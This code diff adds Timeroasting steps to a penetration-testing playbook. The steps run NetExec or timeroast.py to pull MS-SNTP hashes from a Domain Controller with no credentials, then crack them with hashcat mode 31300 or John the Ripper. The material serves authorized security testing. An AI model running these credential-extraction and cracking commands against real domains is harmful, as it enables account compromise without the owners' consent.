@@ -427,7 +427,7 @@ const MASTER_PLAYBOOKS = [
     description: 'Comprehensive Active Directory Kerberos attack methodology on port 88. Covers user enumeration (Kerbrute), AS-REP Roasting, Kerberoasting SPN accounts, and Pass-the-Ticket.',
     port_triggers: [88],
     service_triggers: ['kerberos', 'kpasswd'],
-    tags: ['kerberos', 'active-directory', 'kerberoasting', 'asreproast'],
+    tags: ['kerberos', 'active-directory', 'kerberoasting', 'asreproast', 'timeroasting', 'timeroast'],
     steps: [
       {
         id: 'kerb-userenum',
@@ -464,6 +464,21 @@ const MASTER_PLAYBOOKS = [
         if_success: 'TGS hash captured! Crack with Hashcat mode 13100: `hashcat -m 13100 kerberoast.hashes rockyou.txt -r best64.rule`.',
         if_failure: 'No SPNs found or account credentials invalid. Check LDAP descriptions or SMB shares.',
         references: ['https://wadcoms.github.io/']
+      },
+      {
+        id: 'kerb-timeroast',
+        title: 'Timeroasting (Extract MS-SNTP Hashes from W32Time)',
+        phase: 'exploitation',
+        purpose: 'Query Windows Time Service (W32Time) on the Domain Controller over UDP port 123 using RID ranges to extract crackable MS-SNTP MD5 authentication digests with zero initial credentials.',
+        command: "nxc smb {{TARGET}} -u '' -p '' -M timeroast",
+        expected_output: ['[*] Querying DC for RID 500 (Administrator)...', '$ntp$1$82f9...$91b3...', '[+] Captured MS-SNTP hash for Administrator'],
+        common_mistakes: [
+          'If NetExec fails, fallback to standalone script: python3 timeroast.py --dc-ip {{TARGET}} -r 500-2000 -outputfile timeroast.hashes.',
+          'W32Time uses UDP port 123; ensure UDP traffic to the DC is not filtered.'
+        ],
+        if_success: 'MS-SNTP hash captured! Crack with Hashcat mode 31300: `hashcat -m 31300 timeroast.hashes rockyou.txt -r best64.rule`.',
+        if_failure: 'Target DC does not support W32Time authentication or UDP port 123 is closed.',
+        references: ['https://github.com/Secarma/timeroast', 'https://hashcat.net/wiki/doku.php?id=example_hashes']
       },
       {
         id: 'kerb-pass-the-ticket',
@@ -1812,6 +1827,21 @@ const MASTER_PLAYBOOKS = [
         if_success: 'Account password recovered! Use credentials for domain reconnaissance.',
         if_failure: 'Try rule-based dictionary attacks.',
         references: ['https://wadcoms.github.io/']
+      },
+      {
+        id: 'hash-crack-timeroast',
+        title: 'Crack Timeroast MS-SNTP Hashes (Mode 31300)',
+        phase: 'exploitation',
+        purpose: 'Crack Windows Time Service (W32Time) MS-SNTP authentication digest hashes extracted via Timeroasting.',
+        command: 'hashcat -m 31300 timeroast.hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule -O',
+        expected_output: ['$ntp$1$82f9...$91b3...:Password123!', 'Status: Cracked'],
+        common_mistakes: [
+          'Ensure hash file format matches Hashcat mode 31300 (format `$ntp$1$<salt>$<hash>`).',
+          'For John the Ripper, use `john --format=timeroast timeroast.hashes --wordlist=/usr/share/wordlists/rockyou.txt`.'
+        ],
+        if_success: 'Plaintext account password cracked! Authenticate to domain services.',
+        if_failure: 'Password not in rockyou.txt. Try rule mutations or custom wordlists.',
+        references: ['https://hashcat.net/wiki/doku.php?id=example_hashes']
       },
       {
         id: 'hash-crack-shadow',
